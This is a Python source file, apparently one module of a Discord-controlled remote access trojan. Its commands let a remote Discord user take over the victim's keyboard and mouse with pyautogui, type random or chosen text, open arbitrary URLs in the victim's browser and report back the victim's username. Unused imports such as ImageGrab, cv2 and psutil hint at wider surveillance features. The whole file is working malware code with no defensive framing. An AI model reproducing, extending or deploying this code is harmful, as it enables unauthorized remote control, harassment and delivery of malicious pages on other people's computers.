import getpass
import os
import platform
import pwd
import re
import socket
import textwrap
import uuid
from datetime import datetime
from PIL import ImageGrab
from functools import partial
import discord
import psutil
import requests
import pyautogui
import cv2
import asyncio
import time
import random
import string
import webbrowser
from discord.ext import commands


class Fun(commands.Cog, description="System Information"):

    def __init__(self, client: commands.Bot):
        self.client = client

    @commands.command()
    async def hijack(self, ctx, mode="keyboard", time="90", *text):
        try:
            if mode.lower() in ("keyboard", "key", "k"):
                start_time = 0
                end_time = 20
                if text is None:
                    while True:
                        if start_time <= end_time:
                            randint = random.randint(0, 25)
                            randomstring = (string.ascii_lowercase+string.ascii_uppercase +
                                            string.ascii_letters+string.digits+string.punctuation)
                            pyautogui.write(''.join(random.choice(randomstring)
                                            for i in range(randint)))
                            start_time = start_time+1
                        else:
                            break
                else:
                    while True:
                        if start_time <= end_time:
                            randint = random.randint(0, 25)
                            randomstring = f"{text}"
                            pyautogui.write(''.join(random.choice(randomstring.split(" "))
                                            for i in range(randint)))
                            start_time = start_time+1
                        else:
                            break
                await ctx.send(f"Finished hijacking the keyboard of {getpass.getuser()}")
            else:
                screen_size = pyautogui.size()
                start_time = 0
                end_time = 90
                while True:
                    if start_time <= end_time:
                        ycoord = random.randint(0, screen_size[0])
                        xcoord = random.randint(0, screen_size[1])
                        if pyautogui.onScreen(xcoord, ycoord):
                            pyautogui.moveTo(xcoord, ycoord)
                            start_time = start_time+1
                    else:
                        break
                await ctx.send(f"Finished hijacking the mouse of {getpass.getuser()}")

        except Exception as e:
            await ctx.send(str(e))
            return

    @commands.command()
    async def browser(self, ctx, *url):
        try:
            all_links = "**Opened URLs:** \n"
            for link in url:
                link = str(link) if str(link).startswith(
                    "http") == True else "http://" + str(link)
                webbrowser.open(link)
                all_links += f"{link}\n"

            embed = discord.Embed(
                title=f"Opened {len(url)} {'URLs' if len(url) > 1 else 'URL'} in {getpass.getuser()}'s Browser",
                description=all_links,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return


def setup(client: commands.Bot):
    client.add_cog(Fun(client))
